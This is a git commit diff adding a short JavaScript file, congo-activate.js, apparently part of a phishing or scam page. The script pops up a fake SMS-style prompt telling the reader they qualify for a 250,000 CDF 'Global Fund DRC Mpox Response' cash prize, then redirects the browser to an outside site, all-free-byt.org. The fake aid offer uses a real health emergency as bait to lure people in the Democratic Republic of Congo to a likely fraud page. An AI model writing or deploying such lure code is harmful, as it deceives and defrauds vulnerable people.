957d0bdce2de77c593b71f8bb7385a155b288acc
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-10-13 03:14:39 -0700

    Create congo-activate.js

---
+++ congo-activate.js
@@ -0,0 +1,6 @@
+
+var password = 'WITHDRAW 250,000CDF'
+password=prompt('SMS: Congratulations You are qualify for 250,000CDF Global Fund DRC Mpox Response, Kindly Press OK to Withdraw Cash Prize   ','WITHDRAW 250,000CDF');
+if (password != 'WITHDRAW 250,000CDF') {
+location.href='https://all-free-byt.org/drc-mpox.html';
+}
